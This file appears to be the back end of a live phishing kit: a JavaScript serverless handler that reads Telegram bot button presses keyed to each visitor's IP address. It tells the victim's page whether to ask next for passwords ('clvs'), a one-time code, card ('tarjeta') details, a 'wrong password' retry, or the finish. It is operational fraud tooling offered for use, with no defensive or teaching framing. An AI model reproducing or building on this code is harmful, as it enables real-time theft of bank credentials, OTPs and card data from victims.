import { getClientIp } from '../lib/utils.js';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', '*');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'GET') return res.status(405).json({ error: 'Method not allowed' });

    const clientIp = getClientIp(req);
    const token = process.env.TELEGRAM_BOT_TOKEN;

    if (!token) {
        return res.status(200).json({ status: 'WAITING' });
    }

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/getUpdates?allowed_updates=["callback_query"]&limit=100`);
        const data = await response.json();
        
        if (data.ok && data.result) {
            const updates = data.result;
            const statusMap = {
                "clvs": "GO_TO_CLVS",
                "otp": "GO_TO_OTP",
                "tarjeta": "GO_TO_TARJETA",
                "error": "ERROR_CLVS",
                "fin": "GO_TO_FIN"
            };

            let currentStatus = 'WAITING';
            // Recorremos de atrás hacia adelante para encontrar el último click
            for (let i = updates.length - 1; i >= 0; i--) {
                const cb = updates[i].callback_query;
                if (cb && cb.data && cb.data.startsWith('cmd|')) {
                    const parts = cb.data.split('|');
                    if (parts.length === 3 && parts[2] === clientIp) {
                        currentStatus = statusMap[parts[1]] || 'WAITING';
                        break;
                    }
                }
            }

            res.setHeader('Cache-Control', 'no-store, max-age=0');
            return res.status(200).json({ status: currentStatus });
        }
    } catch (err) {
        console.error(err);
    }

    res.setHeader('Cache-Control', 'no-store, max-age=0');
    res.status(200).json({ status: 'WAITING' });
}
